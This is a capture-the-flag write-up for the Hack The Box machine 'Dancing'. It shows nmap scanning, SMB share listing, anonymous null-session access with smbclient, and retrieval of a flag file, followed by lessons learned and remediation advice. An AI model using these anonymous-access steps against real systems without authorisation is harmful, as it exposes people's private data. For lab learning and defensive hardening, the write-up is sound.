# Dancing — HTB Starting Point

**Difficulty:** Very Easy
**OS:** Windows
**Path:** Starting Point — Tier 0

## Summary

Dancing focuses on SMB share enumeration and null session access. The target exposed a non-default share (`WorkShares`) that allowed anonymous read access, containing a user directory with a readable flag file.

## Recon

```
nmap -sC -sV -T4 <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-08-16T01:51:56
|_  start_date: N/A
|_clock-skew: 3h59m59s
```

Windows host with standard SMB-related ports open (135, 139, 445) plus WinRM (5985). Box name and description pointed directly at SMB (445) as the intended attack surface.

## Enumeration

Listed available shares:

```
smbclient -L //<TARGET_IP>
```

**Results:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

`ADMIN$` and `C$` are default administrative shares, typically inaccessible without privileged credentials. `WorkShares` stood out as the only non-default share, making it the logical target for anonymous access.

## Exploitation

Connected to the `WorkShares` share using a null session (blank username/password):

```
smbclient //<TARGET_IP>/WorkShares -N
```

Connection succeeded, confirming anonymous read access was permitted. Listed contents:

```
ls
```

Found a user directory, navigated into it:

```
cd James.P
ls
```

Located `flag.txt`, downloaded it:

```
get flag.txt
```

Exited and read locally:

```
quit
cat flag.txt
```

**Root cause:** SMB share configured to allow anonymous (null session) access to a directory containing user files, exposing data that should require authentication.

## Privilege Escalation

Not required, flag was directly accessible via the anonymously-readable share.

## Flag

```
cat flag.txt
```

Flag captured (redacted for this writeup).

## Lessons Learned

- Always enumerate all available shares with `smbclient -L` before assuming access is blocked, default shares (`ADMIN$`, `C$`) are usually locked down, but custom/named shares are worth testing individually.
- Null sessions (`-N`, blank credentials) remain a common and effective first test against SMB, especially on beginner-tier or misconfigured hosts.
- Share names and box context (e.g., "WorkShares" on a box themed around file access) can hint at the intended path, worth factoring into enumeration priorities.

## Remediation (real-world)

- Disable anonymous/null session access to SMB shares.
- Enforce authentication and least-privilege access control on all shares, especially those containing user or business data.
- Enable SMB signing as required (not just enabled) to prevent relay-based attacks, noted here as "enabled but not required" in the nmap scan.
